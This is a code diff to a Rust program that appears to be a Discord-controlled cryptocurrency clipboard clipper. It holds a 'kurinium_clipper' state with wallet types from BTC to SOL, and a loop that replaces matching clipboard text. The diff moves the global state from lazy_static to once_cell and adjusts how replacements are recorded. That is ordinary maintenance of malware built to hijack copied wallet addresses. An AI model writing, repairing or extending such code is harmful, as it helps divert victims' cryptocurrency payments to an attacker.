@@ -5,8 +5,8 @@ use std::sync::Arc;
 use twilight_http::Client as HttpClient;
 use twilight_model::channel::message::Message;
 use clipboard_win::{get_clipboard_string, set_clipboard_string};
+use once_cell::sync::Lazy;
 use tokio::sync::RwLock;
-use lazy_static::lazy_static;
 use std::collections::HashMap;
 use std::path::PathBuf;
 use std::fs;
@@ -16,24 +16,22 @@ use regex::Regex;
 const CLIPPER_DB_PATH: &str = "C:\\Users\\Public\\Documents\\kurinium_clipper.txt";
 const CRYPTO_WARNING: &str = "please set the clipper.";
 
-lazy_static! {
-    static ref CLIPPER_STATE: RwLock<ClipperState> = {
-        let mut crypto_warnings = HashMap::new();
-        crypto_warnings.insert(CryptoType::BTC, CRYPTO_WARNING.to_string());
-        crypto_warnings.insert(CryptoType::ETH, CRYPTO_WARNING.to_string());
-        crypto_warnings.insert(CryptoType::LTC, CRYPTO_WARNING.to_string());
-        crypto_warnings.insert(CryptoType::USDT, CRYPTO_WARNING.to_string());
-        crypto_warnings.insert(CryptoType::USDC, CRYPTO_WARNING.to_string());
-        crypto_warnings.insert(CryptoType::SOL, CRYPTO_WARNING.to_string());
+static CLIPPER_STATE: Lazy<RwLock<ClipperState>> = Lazy::new(|| {
+    let mut crypto_warnings = HashMap::new();
+    crypto_warnings.insert(CryptoType::BTC, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::ETH, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::LTC, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::USDT, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::USDC, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::SOL, CRYPTO_WARNING.to_string());
 
-        RwLock::new(ClipperState {
-            is_running: false,
-            rules: HashMap::new(),
-            last_content: String::new(),
-            crypto_warnings,
-        })
-    };
-}
+    RwLock::new(ClipperState {
+        is_running: false,
+        rules: HashMap::new(),
+        last_content: String::new(),
+        crypto_warnings,
+    })
+});
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 enum CryptoType {
@@ -624,7 +622,7 @@ impl ClipperCommand {
                             if new_content.contains(from.as_str()) {
                                 new_content = new_content.replace(from, to);
                                 replaced = true;
-                                replacements.push((from.clone(), to.clone()));
+                                replacements.push((from.clone(), to.to_string()));
                             }
                         }
                     }
